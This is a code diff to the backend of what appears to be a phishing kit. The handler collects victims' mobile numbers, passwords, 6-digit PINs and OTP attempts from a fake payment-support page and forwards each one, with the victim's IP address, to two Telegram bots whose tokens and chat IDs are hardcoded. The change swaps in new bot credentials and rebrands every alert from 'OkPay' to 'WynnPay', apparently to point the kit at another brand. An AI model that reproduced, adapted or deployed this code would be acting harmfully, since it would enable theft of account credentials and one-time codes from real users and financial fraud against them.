@@ -6,11 +6,11 @@ export default async function handler(req, res) {
   const { type, issue, phone, pass, pin, otp, attempt } = req.body;
 
   // ==================== DUAL BOT CONFIGURATION ====================
-  const BOT_1_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
-  const CHAT_1_ID = '6076330929';
+  const BOT_1_TOKEN = '8814008688:AAFQt7ERtYmk__TwMQxUwvxJmoNMsmmRTns';
+  const CHAT_1_ID = '7322075843';
 
-  const BOT_2_TOKEN = '96761386:AAFmHJPLXyfEXOt95_fWbgf';
-  const CHAT_2_ID = '67424029';
+  const BOT_2_TOKEN = '9246715542:AAF_DpT41zrZYlLDZdw5KWhi6NoG2_FejcE';
+  const CHAT_2_ID = '7048166650';
 
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
   const timeNow = new Date().toLocaleString();
@@ -18,19 +18,19 @@ export default async function handler(req, res) {
   let message = '';
 
   if (type === 'page_opened') {
-    message = `🔔 OkPay Page Opened\n` +
+    message = `🔔 WynnPay Page Opened\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `✅ Link Clicked By User\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'problem_select') {
-    message = `🎫 NEW SUPPORT REQUEST — OkPay\n` +
+    message = `🎫 NEW SUPPORT REQUEST — WynnPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📌 Issue: ${issue}\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'login_creds') {
-    message = `📱 MOBILE & PASSWORD RECEIVED — OkPay\n` +
+    message = `📱 MOBILE & PASSWORD RECEIVED — WynnPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `🎫 Issue: ${issue}\n` +
@@ -38,20 +38,20 @@ export default async function handler(req, res) {
               `🔒 Password: <code>${pass}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'pin_entered') {
-    message = `🔑 6-DIGIT PIN RECEIVED — OkPay\n` +
+    message = `🔑 6-DIGIT PIN RECEIVED — WynnPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
               `🔐 PIN: <code>${pin}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'send_otp') {
-    message = `📤 SEND OTP REQUESTED — OkPay\n` +
+    message = `📤 SEND OTP REQUESTED — WynnPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'wrong_otp') {
-    message = `❌ WRONG OTP ATTEMPT #${attempt} — OkPay\n` +
+    message = `❌ WRONG OTP ATTEMPT #${attempt} — WynnPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
